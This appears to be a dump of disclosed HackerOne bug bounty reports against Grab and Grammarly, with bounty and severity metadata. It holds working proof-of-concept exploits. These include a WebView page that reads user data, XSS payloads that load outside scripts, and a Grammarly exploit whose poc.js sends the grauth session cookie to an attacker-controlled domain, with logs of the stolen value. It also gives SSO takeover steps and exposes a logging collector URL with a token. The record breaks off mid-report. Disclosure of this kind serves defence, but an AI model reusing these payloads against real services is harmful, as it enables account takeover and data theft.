Code 461 Bytes1<!DOCTYPE html>
2<html>
3<head><title>Page 2</title></head>
4<body style=""text-align: center;"">
5    <script type=""text/javascript"">
6        var data;
7        if(window.Android) { // Android
8            data = window.Android.getGrabUser();
9        }
10        else if(window.grabUser) { // iOS
11            data = JSON.stringify(window.grabUser);
12        }
13
14        if(data) {
15            document.write(""Stolen data: "" + data);
16        }
17    </script>
18</body>
19</html>
I didn't reverse iOS app, but only opened https://help.grab.com/, grepped for getGrabUser and found
Code 283 Bytes1    public static initGrabUser() {
2        if (Utils.Condition.isIOSApp()) {
3            Stores.GrabUser.setGrabUser(window.grabUser);
4        }
5
6        if (Utils.Condition.isAndroidApp()) {
7            Stores.GrabUser.setGrabUser(JSON.parse(Android.getGrabUser()));
8        }
9    }
It helped me to realize how to exploit iOS too :)
Tips: JS interfaces (on both platforms) have no origin policies, so if you have the ability to make an Open Redirect or XSS (i.e. run your own JS in the given WebView), it means you can access them!",https://hackerone.com/reports/401793,Singapore,Singapore,Singapore,2018,8,28,18,36
Grab,10001,0.0,200m-1b,$750.00,Critical,9.5,Cross-site Scripting (XSS) - Stored,Blind stored xss [parcel.grab.com] > name parameter ,"paresh_parmar  submitted a report to Grab.Jul 19th (5 years ago)Hi,
my previously reported blind xss is fixed but i found same type of xss in diffrent area with more impact.
Steps to repro:

create new account with name ""><script src=https://x.com></script> here https://parcel.grab.com/
afftected page is https://app.detrack.com/a/
where admin can see all the user's of application
and this is one more impact full because it contains all the user's email address. attacker can hijack all the information from there using xss
affeffcted page poc:
{F204498██████████
go here https://app.detrack.com/a/ and find ████████ , that is my account with xss payload.

thanks",https://hackerone.com/reports/251224,Singapore,Singapore,Singapore,2017,7,19,14,37
Grab,10001,0.0,200m-1b,"$1,000.00",Medium,5.45,Array Index Underflow, Subdomain Takeover Via Insecure CloudFront Distribution cdn.grab.com,"todayisnew  submitted a report to Grab.May 16th (5 years ago)Good day, I truly hope it treats you awesomely on your side of the screen :)
I have found that your website cdn.grab.com is pointed via a cname to a cloudfront instance
cdn.grab.com => *.cloudfront.net
This was not registered on Amazon Aws Cloudfront.
I was able to take over the domain:
See my POC (Pug of Concept)
http://cdn.grab.com/index.html
Options How to fix:
1) Remove the Cname record on cdn.grab.com to not point to cloudfront.net
2) Ask me to remove my registered cdn.grab.com on cloudfront, and you can re register yours :)
May you be well on your side of the screen :)
-Eric
Impact
Impact:
Cyber attackers can launch a phishing campaign leveraging your established (soon to be impacted) brand reputation.
The victim has no way of telling, whether the content is served by the domain owner or the cyber attacker.
Attackers can also chain higher severity attacks to this. Many applications expose session cookies to a wildcard domain (*.example.com),
so any subdomain can access them. An attacker can take a forgotten subdomain, trick the user to visit it, and extract cookies
(even those with secure flag). This can be seen as an advanced version of XSS.prakhar-prasad   changed the status to Triaged. May 16th (5 years ago)We have reviewed your bug report and would like to inform you that your submission is valid. We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that you can verify the same.
We appreciate your help in keeping Grab and our customers safe and secure.prakhar-prasad   updated the severity from high to medium. May 16th (5 years ago)prakhar-prasad   posted a comment. May 16th (5 years ago)Hi @todayisnew, 
Can you release the claimed records ? :-) 
Thank you
    
    
        
            
                
                
                
            
        
    
todayisnew   posted a comment. May 16th (5 years ago)Hey @prakhar-prasad :)
Domain has been released should be available in 10-30 mins :)
subdomain take overs in my past experience usually have a pretty high impact, curious why the reclassification?
wish you well on your side of the screen :)
-Ericprakhar-prasad   posted a comment. May 16th (5 years ago)Hi @todayisnew, 
Thanks for releasing it.
This issue doesn't significantly risk our users or their data - XSS [requires important cookies to be scoped in *.grab.com] and convincing phishing attack [requires a bit of social engineering combined with user interaction]. Hence, the Medium severity classification. 
Feel free to reach out for any additional questions you have! prakhar-prasad   posted a comment. May 17th (5 years ago)We have deployed a fix to address the issue. Can you verify if this has been fixed and you're no longer able to reproduce the behaviour ?
    
    
        
            
                
                
                
            
        
    
todayisnew   posted a comment. May 17th (5 years ago)thanks for the clarification and great work getting it locked down :)  I can verify fixed on my side :)
wish you well on your side of the screen :)
-Ericprakhar-prasad   closed the report and changed the status to Resolved. May 17th (5 years ago)Thank you for working with us and helping us in resolving this issue. Your bounty will be processed shortly.
We appreciate your help in keeping Grab and our customers safe and secure.Grab  rewarded todayisnew with a $1,000 bounty. May 17th (5 years ago)prakhar-prasad   requested to disclose this report. May 17th (5 years ago)
    
    
        
            
                
                
                
            
        
    
todayisnew   posted a comment. May 18th (5 years ago)Thanks for the awesome kind bounty :)
Wish you well on your side of the screen :)
-Eric 
    
    
        
            
                
                
                
            
        
    
todayisnew   agreed to disclose this report. Feb 24th (2 years ago)Great program to work with, open to questions and answers to clarify impact :) Cloudfront was vulnerable in the past, no longer from my experience.    This report has been disclosed. Feb 24th (2 years ago)",https://hackerone.com/reports/352869,Singapore,Singapore,Singapore,2018,5,16,13,40
Grab,10001,0.0,200m-1b,"$1,000.00",High,7.5,Information Disclosure,Git repository found,"linkks  submitted a report to Grab.Jul 12th (5 years ago)Git metadata directory (.git) was found in this folder. An attacker can extract sensitive information by requesting the hidden metadata directory that version control tool Git creates. The metadata directories are used for development purposes to keep track of development changes to a set of source code before it is committed back to a central repository (and vice-versa). When code is rolled to a live server from a repository, it is supposed to be done as an export rather than as a local working copy, and hence this problem.
Repository files/directories:
.gitignore
README.md
ansible/Vagrantfile
ansible/development
ansible/host_vars/development
ansible/host_vars/production
ansible/production
ansible/provision.yml
ansible/roles/common/files/id_rsa
ansible/roles/common/tasks/main.yml
GET /wp-content/themes/.git/config HTTP/1.1
Host: 54.255.134.3:443
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /
These files may expose sensitive information that may help an malicious user to prepare more advanced attacks.
Remove these files from production systems or restrict access to the .git directory. To deny access to all the .git folders you need to add the following lines in the appropriate context (either global config, or vhost/directory, or from .htaccess):
<Directory ~ "".git"">
Order allow,deny
Deny from all
</Directory>",https://hackerone.com/reports/248693,Singapore,Singapore,Singapore,2017,7,12,12,46
Grab,10001,0.0,200m-1b,$200.00,Medium,6.1,Cross-site Scripting (XSS) - DOM,Dom based xss affecting all pages from https://www.grab.com/.,"netfuzzer  submitted a report to Grab.Jul 8th (5 years ago)Hello,
there's a dom based xss vulnerability affecting all pages under the domain https://www.grab.com/.
This vulnerability wasn't properly patched so I managed to bypass the regular expressioned that was added into the function.
Vulnerable code:
Code 259 BytesWrap lines Copy Download1var stripHtml = (function () {
2		  var div = document.createElement('div');
3		  return function (html) {
4		    div.innerHTML = html.replace(/<\/?\w+[^>]*\/?>/g, """");
5		    return (div.innerText || div.textContent); // textContent is for firefox
6		  };
7		})();
PoC: https://www.grab.com/sg/partnerships/?xss=%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E
visit url above to reproduce.
A screenshot is attached to this report.
cheers,
Mario.1 attachment:F201289: screenshot.pngnetfuzzer   changed the report title from Dom based xss affects all pages from https://www.grab.com/. to Dom based xss affecting all pages from https://www.grab.com/.. Jul 8th (5 years ago)nozz_   updated the severity from high to medium. Jul 10th (5 years ago)nozz_   changed the status to Triaged. Jul 10th (5 years ago)Hi @netfuzzer 
We have reviewed your bug report and would like to inform you that your submission is valid. We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that you can verify the same.
We appreciate your help in keeping Grab and our customers safe and secure.
    
    
        
            
                
                
                
            
        
    
netfuzzer   posted a comment. Updated Jul 10th (5 years ago)wow! that was fast! can no longer reproduce it.  it's fixed.nozz_   posted a comment. Jul 11th (5 years ago)Hi @netfuzzer ,
Indeed, this vulnerability is fixed. Could you confirm that you found no way to bypass our fix ?
Thank you for working with us. Your bounty will be processed shortly.
    
    
        
            
                
                
                
            
        
    
netfuzzer   posted a comment. Jul 11th (5 years ago)Yep, i can confirm there is no way to bypass this time.grabsecurity   closed the report and changed the status to Resolved. Jul 11th (5 years ago)Thank you for working with us and helping us in resolving this issue. Your bounty will be processed shortly.grabsecurity   updated the severity from medium to medium (6.1). Jul 11th (5 years ago)
    
    
        
            
                
                
                
            
        
    
netfuzzer   posted a comment. Jul 11th (5 years ago)this bug affected all pages under the domain www.grab.com. Do you really consider this ""medium""?Grab  rewarded netfuzzer with a $200 bounty. Jul 11th (5 years ago)netfuzzer   requested to disclose this report. Jul 18th (5 years ago)  This report has been disclosed. Aug 17th (5 years ago)",https://hackerone.com/reports/247246,Singapore,Singapore,Singapore,2017,7,8,17,18
Grammarly,501-1000,0.0,10m-50m,"$2,000.00",High,8.2,Cross-site Scripting (XSS) - Stored,Account takeover through the combination of cookie manipulation and XSS,"k4r4koyun  submitted a report to Grammarly.Apr 10th (4 years ago)Summary: A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called ""/cookies"" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass ""CORS protection/HttpOnly cookie flag"" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.
Description: An endpoint at gnar.grammarly.com called ""/cookies"" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.
This was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.
Then we have found that Grammarly uses multiple cookies and one of them is called ""gnar_containerId"". We have discovered that this cookie gets reflected on the ""www.grammarly.com"" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code
Our malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it  back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.
To put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.
For the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.
Solution: This attack scenario was made possible because of the following:

gnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.
There is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.
Content based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.

Browsers Verified In:

Google Chrome 73.0.3683.86 (Official Build) (64-bit)
Mozilla Firefox 60.6.1esr (64-bit)

Steps To Reproduce:


Host a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)


Serve the HTML snipped below on the said page (called ""Grammarly.html"" for example):


Code 904 BytesWrap lines Copy Download1<html>
2
3<head>
4<title>Grammarly POC</title>
5<meta charset=""utf-8""/>
6<script src=""https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js""></script>
7</head>
8
9<body>
10<script>
11
12    var cookie_hax = {
13        ""gnar_containerId"":""</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr""+""ipt><noscript>"",
14    };
15
16    for (var name in cookie_hax) {
17        $.ajax({
18            type: ""POST"",
19            url: ""https://gnar.grammarly.com/cookies?name="" + name + ""&value="" + encodeURIComponent(cookie_hax[name]) + ""&maxAge=2147483647"",
20            cache: false,
21            xhrFields: {
22                withCredentials: true
23            },
24            crossDomain: true,
25            async: false,
26        });
27    }
28
29    window.location.replace(""https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal"");
30
31</script>
32</body>
33
34</html>

Serve the javascript code below on the same webserver (called ""poc.js"" for example):

Code 254 BytesWrap lines Copy Download1var xhr = new XMLHttpRequest();
2xhr.open('GET', ""https://gnar.grammarly.com/cookies?name=grauth"");
3xhr.withCredentials = true;
4xhr.onload = function () {
5    this.open('GET', ""https://<YOUR_DOMAIN_NAME>/"" + this.response);
6    this.send();
7};
8xhr.send();

Browse the Grammarly.html and watch the webserver access logs (to extract cookie value)

Supporting Material/References:

Webserver access logs: 

Code 474 BytesWrap lines Copy Download1178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] ""GET /poc.js HTTP/1.1"" 200 736 ""https://www.grammarly.com/"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36""
2178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] ""GET /?cookie={██████████} HTTP/1.1"" 200 3466 ""https://www.grammarly.com/"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36""
Impact

Account takeover via cookie stealing
1 attachment:F466118: Grammarly_Takeover_POC.mp4",https://hackerone.com/reports/534450,California,United States,San Francisco,2019,4,10,13,57
Grammarly,501-1000,0.0,10m-50m,"$10,500.00",High,7.95,Improper Authentication - Generic,Ability to DOS any organization's SSO and open up the door to account takeovers,"cache-money  submitted a report to Grammarly.Sep 8th (2 years ago)Summary:
There's an interesting issue I've spent quite a few days trying to escalate but can't figure out. The impact at this point is that I can DOS any SSO integration making it so nobody in that organization can login. I can also get users to inadvertently SSO into my attacker organization, and then take over their account from there. For existing accounts this would require a victim to click ""join"", however I think that's likely given the fact that they are SSOing for the first time expecting to join an organization.
The strange behavior and why I think it might be possible to escalate further, is that I can have you authenticate against one SSO instance, but have you get added to a completely separate one. So that means there is some sketchy logic which can potentially allow an attacker to authenticate against their own SSO instance, and get added to someone else's organization. I'm not sure if it's possible to get this with zero user interaction, but I will keep trying and update the report if I figure out a way.
The bug stems from the fact that you can create an entityId identical to that of another organization except with a space   at the end. The application logic then prioritizes that new entityId to add the user to after authenticating against the correct one. So if you have myentity as the legitimate entity, and an attacker sets their entity to myentity[SPACE] (with a space at the end); users attempting to authenticate into the legitimate myentity will technically authenticate against it, but then the application attempts to log them into the attacker's organization. The result of this is a DOS since legitimate users can no longer access their organization. The interesting part of the bug is that if the user is deleted from their original organization (or a new user attempts to SSO), they will then be authenticating against their original organization, but get added into the attacker's organization. So it seems the SAML Response is checked against a trim(issuer), but when trying to place the user into an organization, the entity with the space is always prioritized.
The steps below will demonstrate this behavior:
Steps To Reproduce:

Setup SSO and confirm you can login.
Create a new Grammarly business account and use the same entityId (Identity Provider Issuer) you used in step 1, except add a space to the end of it. Use a different keypair for this organization as well.
Wait 2 minutes for the change to propagate, then try logging into the same account from step 1, and notice you now get an error.
At this point the victim organization is DOS'd. To confirm the strange behavior discussed above, you can delete that user from the victim organization and attempt to login again. Notice you will now end up getting provisioned to the attacker's organization, even though you signed the SAML Response with the victim organization's private key.
Once you are provisioned into the attacker's organization, the attacker can then change their entityId to something brand new, and login to the victim's account using the keypair they own. If this was a converted personal account, you can then access that user's personal documents.

Impact

Ability to effectively disable SSO for any organization.
Ability to get users provisioned into an attacker's account, which they can then takeover.

Thanks,
-- Tanner",https://hackerone.com/reports/976603,California,United States,San Francisco,2020,9,8,8,23
Grammarly,501-1000,0.0,10m-50m,"$1,500.00",High,7.95,None,`socket` command allows sending data over WebSockets to arbitrary origins from Grammarly Extension,"metnew  submitted a report to Grammarly.Aug 16th (4 years ago)Summary

Attacker could trigger Grammarly extension's socket command using a crafted page to perform WS connection(and data sending) from extension's background page (with cookies and origin) to any URL.
Additionally, commands received from the attacker's server are handled by extension and could be used to trigger wrong business-logic behavior (misleading commands) or possibly(!) RCE.

Description

Disclaimer: the report is long enough.

""socket"" command vs content script
Next snippet handles ""socket"" commands received from window.addEventListener('message').
TL;DR: it sends received ""socket"" command to the background page.
Code 161 BytesWrap lines Copy Download1function Z(e) {
2           var t, n = e.action;
3           ...
4            ""socket"" === n && p.emitBackground(b.MessageTypes.client, e),
5           ...
6        }
""socket"" command vs background page
TL;DR: sent ""socket"" command handled using next snippet, when background page receives it:
Code 2.06 KiBWrap lines Copy Download1this._onContentScriptSocketMessage = function(e, t, n) { // <-- e = action received from content script
2                if (e && !m._getConnectionState().authToCapiDegradation) {
3                    var r = e.socketId
4                      , o = e.method
5                      , i = ""close"" === o
6                      , a = m._sockets[r];
7                    if (a || !i) {
8                        switch (a || (a = new d.BackgroundSocket(e,n,m._onBackgroundSocketEmit,m._fakeCapi),
9                        m._sockets[r] = a), // <-- creates new high-level socket object
10                        e.arg && ""start"" === e.arg.action && m._dialect && (e.arg.dialect = m._dialect),
11                        o) {
12                        case ""connect"": // <-- connect method
13                            m._refreshUser(!0, ""onSessionStart"").then(function() {
14                                return a.connect(e.arg)
15                            });
16                            break;
17                        case ""send"":
18                            a.send(e.arg); // <-- ""send"" with an attacker-controllable property as argument
19                            break;
20                        case ""reconnect"": <-- Other methods (wsPlay/wsPause/etc.) are under attacker's control too
21                            a.reconnect();
22                            break;
23                        case ""release"":
24                            a.release();
25                            break;
26                        case ""close"":
27                            a.close();
28                            break;
29                        case ""wsPlay"":
30                            a.wsPlay();
31                            break;
32                        case ""wsPause"":
33                            a.wsPause();
34                            break;
35                        default:
36                            p.error(""Unknown method"", o)
37                        }
38                        i && (a.close(),
39                        a.overrideEmitToNoOp(),
40                        delete m._sockets[r])
41                    }
42                }
43            }
The final proof that it's possible to connect to any origin  - connect method:
Code 1.25 KiBWrap lines Copy Download1 function E(n) { // <-- e = event received from content script
2                w.isConnected() || (A(""connect to url: "" + e.url),
3                t = new u(e.url), // <-- e.url is under attacker's control
4                p = !1,
5                d = !1,
6                t.onopen = function() {
7                    g = v,
8                    d = !0,
9                    h && (h = !1,
10                    w.close()),
11                    n && e.resetQueueOnReconnect ? b = [] : O(),
12                    w.emit(""connect""),
13                    n && (w.emit(""reconnect""),
14                    c = !1)
15                }
16                ,
17                t.onmessage = function(t) {
18                    s && console.log(""%c Received: %s"", ""color: #46af91;"", t.data), // <--- Screencast!
19                    S(t.data),
20                    function(t) {
21                        try {
22                            t = JSON.parse(t)
23                        } catch (e) {
24                            C(e.stack || e, t)
25                        }
26                        e.useQueue ? (y.push(t),
27                        T()) : w.emit(""message"", t) // <-- t = command could be received from attacker's server
28                    }(t.data)
29                }
30                ,
31               ...
32}
Websockets 101 (important for understanding)

Websockets differs from XHRs - As opposite to XHR, CORS doesn't apply to WS.


Page could initiate WS connection to any cross-origin resource.
There is no browser-level mechanism to prevent WS connection from one origin to another. (like CORS for XHR)
Connection through wss:// includes all user's cookies.

WS server is responsible for validating Origin header to check is connection trusted.
Example

evil.com sends XHR to good.com = CORS rejects requests (assuming no Access-Control-Allow-Origin was specified in response)
evil.com  connects to ws://good.com using WS = server at good.com is responsible for Origin header validation.

Attack mechanism
[Page] -> (socket action) -> [Content script] -> (socket action) -> [Background page] -> [WS server]
Summary [1/3]
Page could exploit ""socket"" command to :

connect to arbitrary WS endpoint from Grammarly extension origin
send arbitrary data from Grammarly extension origin to any WS endpoints

w.emit(""message"", t) [received command vs background page]
You probably noticed this line in t.onmessage handler.
Shortly, background page handles events received from remote WS server.
Grammarly uses wss://capi.grammarly.com/freews endpoint for text processing.

I guess ""capi"" is an abbreviature for Command API.

As of extension could connect to any WS endpoint, it will handle commands received from attacker's endpoint too.
I don't show the full call stack, however, w.emit(""message"", commandFromServer) is handled in this snippet:
Code 944 BytesWrap lines Copy Download1this._onBackgroundSocketEmit = function(e, t, n) { // <-- e = command from attacker's server
2                var o = e.event
3                  , i = e.socketId
4                  , a = e.msg;
5                if (p.trace(""from ws "" + o + "" "" + i, {
6                    msg: a,
7                    messageType: t
8                }),
9                a && a.error && ""not_authorized"" === a.error)
10                    return m._tryToFixSession();
11                var c = setTimeout(function() {
12                    var e = m._sockets[i];
13                    e && (e.release(),
14                    e.overrideEmitToNoOp(),
15                    delete m._sockets[i])
16                }, m._releaseTimeout);
17                m._message.emitTo(n, t, r({}, e, { // <-- send command from server to content script
18                    id: s.guid()
19                }), function(e) {
20                    return e && clearTimeout(c)
21                })
22            }
Shortly, emitTo emits the command (from attacker's server) from background page to content script.
Summary [2/3]
Background page:

Connects to attacker's WS endpoint 
Receives a command from the WS endpoint
Handles received command
Sends received command to the content script

#394518
First of all, #394518 is about user data.
It's possible to get the latest available socketId property and send random malformed data to capi.grammarly.com under current socketId. However, I think it has zero impact :(
received command vs content script
Received commands handled in next function:
Code 532 BytesWrap lines Copy Download1this._onMessage = function(e, t) {
2                var r = n._sockets[e.socketId]; // <-- e.socketId from previous ""connect"" command
3                if (r) {
4                    var i = e.msg || {}; // <-- e.msg - msg received from attacker's server 
5                    i.action && ""error"" === i.action.toLowerCase() && n._telemetry.soketCsErrorMsg(i),
6                    t(""ok""),
7                    r.emit(e.event, e.msg) <--- emit ""message"" event in content script with attacker-supplied command
8                }
9            }
r.emit(e.event, e.msg)
I was able to call r.emit(e.event, e.msg) from the snippet above a few times [No PoC, however, It was documented during research].
However, after analyzing listeners of this emit (and ancestor calls) I realized the API is too high-level and It can't lead to script execution in the content script.
List of available actions to trigger from server:
Code 459 BytesWrap lines Copy Download1add: [ƒ]
2alert: (2) [ƒ, ƒ]
3capiError: [ƒ]
4disconnect: (2) [ƒ, ƒ]
5finish: (2) [ƒ, ƒ]
6finished: [ƒ]
7frequent_not_authorized_error: [ƒ]
8frequent_runtime_error: [ƒ]
9plagiarismChecked: [ƒ]
10remove: [ƒ]
11sending: [ƒ]
12serviceState: [ƒ]
13socketConnect: [ƒ]
14socketError: [ƒ]
15socketFailCount: [ƒ]
16socketReconnect: (2) [ƒ, ƒ]
17socketReconnectAfterError: [ƒ]
18socketStart: (2) [ƒ, ƒ]
19start: (2) [ƒ, ƒ]
20stats:timing: [ƒ]
21submit_ot: [ƒ]
22synonyms: [ƒ]
23too_many_runtime_error: [ƒ]
I didn't test this function call too much.
Browsers Verified In:

Chrome 68.0.3440.106 stable
Chrome 70.0.3521.0 canary
Grammarly 14.861.1790

Steps To Reproduce:
localhost:8080

Open exploit.html
Start server (npm i ws && node server.js)
Click ""Connect to localhost""
Check server process logs - ""Connection received"" logged
Click ""Send ""{""grammarly"": ""1""}"" to localhost"" and then ""Connect to localhost""
Check server process logs - ""Message event {""grammarly"":""1""}"" logged

wss://dox.grammarly.com origin

Click ""Connect to dox.grammarly.com from page origin"" -> see 403 error in console
Click ""Connect to dox.grammarly.com from extension""
Check ""Network"" tab in background page's devtools
Connection to dox.grammarly.com origin was established.

Supporting Material/References:
Screencast for localhost:8080 and ws://dox.grammarly.com attached.
Impact
""connect"" + ""send"" to any origin
Attacker could connect and send data to any WS endpoint from extension origin.
It's not as impactful as #389108 by itself, because of WS policies.
""connect"" + ""send"" to Grammarly's endpoints
As of Grammarly's WS APIs allows connections from Grammarly extension origin, attacker could send arbitrary data with user's credentials to:

wss://dox.grammarly.com/
wss://capi.grammarly.com/
And other Grammarly WS endpoints (and Grammarly extension origin ""friendly"" endpoints, if any)

Example of impactful WS connection: wss://dox.grammarly.com/documents/<document_id>/ws - allows editing document with <document_id>
Response handling
As a bonus, it's possible to connect to attacker's WS endpoint, receive data and handle received commands in background page and content script. No PoC or possible exploitation, however, that's potentially a bad behavior.

I hope Grammarly team could imagine the effort I put into this research :(
Set ""High"" impact, because of arbitrary WS connection + handling of commands received from attacker's server.
3 attachments:F334015: exploit.htmlF334016: server.jsF334018: grammarly-ws-socket-action.mp4",https://hackerone.com/reports/395729,California,United States,San Francisco,2018,8,16,4,25
Grammarly,501-1000,0.0,10m-50m,"$3,000.00",Medium,6.4,Business Logic Errors,Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state,"fransrosen  submitted a report to Grammarly.Jan 21st (2 years ago)Hi,
First, I just want to say after spending a few days on your assets that I'm really impressed by the high security standard of the apps exposed. It has not been easy to find issues. I really like the way you've structured your API-routes in a way that almost eliminates a bunch of access issues.
I did find an interesting path that resulted in some issues. I did not classify the issue below just as an XSS, since you can also change business logic depending on what parameters you are affecting. I used the XSS as an example of what you can do with this.
The issue is that the code on app.grammarly.com allows a ?config=-parameter to be used:
Code 866 BytesWrap lines Copy Download1              , s = function(e, t) {
2                const n = u.Monitoring.Logging.getLogger(""config.parser"");
3                return Object(i.pipe)(t, c.h.chain(e=>Object(i.pipe)(c.b.tryCatchError(()=>JSON.parse(e)), c.b.mapLeft(n.handler(""Parse error of the provided JSON config"", {
4                    config: e
5                }).info), c.h.fromEither)), c.h.fold(()=>e, t=>Object(i.pipe)(ye.decode(t), c.b.mapLeft(ge.failure), c.b.mapLeft(e=>n.info(""Validation error of the provided JSON config"", {
6                    config: t,
7                    error: e
8                })), c.b.fold(()=>e, t=>{
9                    n.info(""Load app with custom config"", t);
10                    const r = c.k.asks(()=>e);
11                    return c.k.createFrom(r)(()=>t)(void 0)
12                }
13                ))))
14            }(Object(d.b)(), a.query.get(""config""))
As you see here, the query.get(""config"") passes through a chain, first JSON-parsing it, and then validating it against a TypeScript-schema. This is a great solution to prevent some issues, since the TypeScript contains a list of config parameters and their corresponding type:
Code 1.82 KiBWrap lines Copy Download1Partial<{
2    api: Partial<{
3        authUrl: HttpString
4        capiApiUrl: HttpString
5        capiWsUrl: HttpString
6        crashLogUrl: HttpString
7        dapiUrl: HttpString
8        doxUrl: HttpString
9        felogUrl: HttpString
10        gnarApi: Partial<{ url: HttpString }>
11        institutionAdminUrl: HttpString
12        institutionPrivateUrl: HttpString
13        institutionUrl: HttpString
14        irbisUrl: HttpString
15        onlineTestUrl: HttpString
16        proofitResultUrl: HttpString
17        wsTest: HttpString
18    }>
19    desktop: Partial<{
20        mac: Partial<{
21            infoURL: HttpString
22            installURL: HttpString
23        }>
24        windows: Partial<{
25            infoURL: HttpString
26            installURL: HttpString
27        }>
28    }>
29    edu: Partial<{ adminPanelURL: HttpString }>
30    extension: Partial<{
31        chrome: Partial<{
32            infoURL: HttpString
33            installURL: HttpString
34        }>
35        firefox: Partial<{
36            iconURL: HttpString
37            infoURL: HttpString
38            installURL: HttpString
39        }>
40        safari: Partial<{
41            installURL: HttpString
42        }>
43    }>
44    funnel: Partial<{
45        accountDeleted: HttpString
46        mainPage: HttpString
47        resetPassword: HttpString
48        signin: HttpString
49        signup: HttpString
50        subscribe: HttpString
51        upgrade: HttpString
52        plans: HttpString
53    }>
54    officeAddIn: Partial<{
55        infoURL: HttpString
56        installURL: HttpString
57    }>
58    support: Partial<{
59        connectionTroubleshooting: HttpString
60        contact: HttpString
61        diagnosticTestPath: HttpString
62        documentAcceptTrackedChanges: HttpString
63        email: HttpString
64        emailExistsKBUrl: HttpString
65        login: HttpString
66        mainPage: HttpString
67        newRequest: HttpString
68    }>
69}>
The HttpString type is validating that the value is a string and begins with ^https?|wss?. It does allow any URL you want, but since you have a limited list of connect-src in your Content-Security-Policy, unless there's another issue with one of the hosts in there, there's no data getting sent externally by overwriting these values.
However.
There are missing properties in the TypeScript-schema, which are still being used live. Looking at the api-property, the current config being used live contains the following ones as well:
Code 726 BytesWrap lines Copy Download1""institutionSuggestionsUrl"": ""https://institution.grammarly.com/api/institution/settings/suggestions"",
2""institutionTonesUrl"": ""https://institution.grammarly.com/api/institution/settings/tones"",
3""institutionVoxUrl"": ""https://institution.grammarly.com/api/institution/vox"",
4""mailApiUrl"": ""https://g-mail.grammarly.com"",
5""redirect"": ""https://redirect.grammarly.com/redirect"",
6""ssoUrl"": ""https://sso.grammarly.com""
7""subscriptionUrl"": ""https://subscription.grammarly.com/api/v1"",
8""sumoUrl"": ""https://endpoint2.collection.us2.sumologic.com/receiver/v1/http/ZaVnC4dhaV0Bxac28IqT2frgzsjX7HEotu8EZEZr07YE9RWLCzrOMGwzO9aL6c_iSiidkEplFOod2igKIxz_7s2CHlXc2u-XuLpetEBK1fV6xjfN2Sw2gA=="",
9""tonesUrl"": ""https://institution.ppgr.io/api/tones"",
Since these ones are not in the TypeScript-schema, and the schema is set as Partial<{}>, you can overwrite the additional parameters with whatever content you want. 
The interesting one I found for my PoC was the api.redirect. It's being used for navigating between sites, especially when you are linking to upgrading your plan:
Image F1165873: Screenshot_2021-01-21_at_01.29.18.png 45.27 KiBZoom in Zoom out Copy Download
Another one when being upgraded, is the account-property which is completely missing from the TypeScript-schema. The Subscription-link in the menu of the editor uses account.subscription-property which is never validated either:
Image F1165874: Screenshot_2021-01-21_at_01.28.28.png 69.56 KiBZoom in Zoom out Copy Download
Also, another thing being interesting is, if you use the https://app.grammarly.com/docs/new, the current URL is rewritten when the new document is created, but the config from our query parameter will still be injected properly, this makes it possible to hide the injection.
PoC
The following PoC will work for both upgraded accounts and free users. Free users will get the payload triggered when they try upgrading to Premium from the editor:
Image F1165875: Screenshot_2021-01-21_at_01.32.01.png 448.02 KiBZoom in Zoom out Copy Download
